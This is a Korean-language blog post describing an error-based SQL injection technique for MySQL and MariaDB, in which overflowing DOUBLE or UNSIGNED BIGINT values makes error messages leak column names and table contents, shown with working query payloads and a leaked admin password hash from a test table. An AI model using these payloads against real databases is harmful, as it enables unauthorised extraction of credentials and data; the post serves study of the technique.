---
layout: post
title: Another Error-based SQL Injection on MySQL
comments: true
---

RDot.org에서 우연찮게 발견한 글로 의도적으로 UNSIGNED BIGINT의 범위를 넘김으로써 Error를 출력하는 방법이 나와 있었다. Error-based의 일종일 것이라고 생각 했지만 더 읽어보면 information_schema에서 데이터를 가져오는것이 아닌 방법으로 column명을 알아 낼 수 있었다.

1E308은 DOUBLE, 18446744073709551610는 UNSINGED BIGINT 에러를 발생시킬수 있는 수라고 생각하자.

아래는 컬럼의 갯수를 알아내는 방법이다.
{% highlight text %}
mysql> SELECT (SELECT * FROM member)in(1);
ERROR 1241 (21000): Operand should contain 3 column(s)
{% endhighlight %}

아래는 특정 테이블의 컬럼명을 가져오는 방법이다.
{% highlight text %}
mysql> SELECT 2 * IF((SELECT * FROM(SELECT * FROM member)s)>(SELECT * FROM member LIMIT 1),1E308,1E308);
ERROR 1690 (22003): DOUBLE value is out of range in '(2 * if(((select `s`.`idx`,`s`.`username`,`s`.`password` from (select `test`.`member`.`idx` AS `idx`,`test`.`member`.`username` AS `username`,`test`.`member`.`password` AS `password` from `test`.`member`) `s`) > (select `test`.`member`.`idx`,`test`.`member`.`username`,`test`.`member`.`password` from `test`.`member` limit 1)),1E308,1E308))'
{% endhighlight %}

아래는 테이블의 내용을 가져오는 방법이다.
{% highlight text %}
mysql> SELECT 2 * IF((SELECT * FROM(SELECT * FROM member LIMIT 1)s)>(SELECT * FROM member LIMIT 1),1E308,1E308);
ERROR 1690 (22003): DOUBLE value is out of range in '(2 * if(((select '1','admin','c9c54cb3c5cb3f58ba284531698826eebb620574' from dual) > (select `test`.`member`.`idx`,`test`.`member`.`username`,`test`.`member`.`password` from `test`.`member` limit 1)),1E308,1E308))'
{% endhighlight %}


{% highlight text %}
/* Max length of a error message. Should be kept in sync with MYSQL_ERRMSG_SIZE. */
#define ERRMSGSIZE      (512)
{% endhighlight %}
위 코드를 보면 알 수있듯 이 방법에서 주의 해야할 방법은 Error길이가 512가 최대라는 것이다. 그 이상 넘기는 메세지에 대해서는 볼 수 없기 때문이다.

아래는 기존의 MySQL이 아닌 MariaDB에서 위 방법을 했을 경우 _select #_라고 나와 버리는 것 때문에 아래처럼 다른 방법을 써줘야 한다.
{% highlight text %}
mysql> SELECT 2*(IF((SELECT * FROM (SELECT (version()))s), 18446744073709551610, 18446744073709551610));
ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '(2 * if((select #),18446744073709551610,18446744073709551610))'
mysql> SELECT !x-~0 FROM(SELECT version()x)y;
ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '((not('5.5-MariaDB')) - ~(0))'
{% endhighlight %}

## Reference
* <https://rdot.org/forum/showthread.php?t=3167>